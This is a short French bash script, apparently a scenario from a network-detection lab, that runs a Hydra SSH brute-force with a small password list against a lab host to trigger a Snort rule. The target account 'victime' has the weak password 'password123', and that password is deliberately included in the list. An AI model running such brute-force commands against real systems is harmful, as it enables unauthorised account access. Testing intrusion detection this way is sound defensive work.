#!/bin/bash
# =============================================================================
#  Scénario 2 — Brute-force SSH (Hydra)
#  Déclenche le SID 1000010 côté Snort.
#  La cible possède l'utilisateur "victime" / "password123".
# =============================================================================
TARGET="${1:-172.28.0.40}"

echo "[*] Scénario 2 : brute-force SSH sur ${TARGET}"

# Petite liste de mots de passe (le bon est volontairement dedans)
cat > /tmp/passlist.txt <<'EOF'
123456
admin
root
toor
letmein
password
qwerty
password123
EOF

echo "    -> Lancement Hydra (utilisateur : victime)"
hydra -l victime -P /tmp/passlist.txt -t 4 -f ssh://"${TARGET}" || true

echo "[+] Scénario 2 terminé."
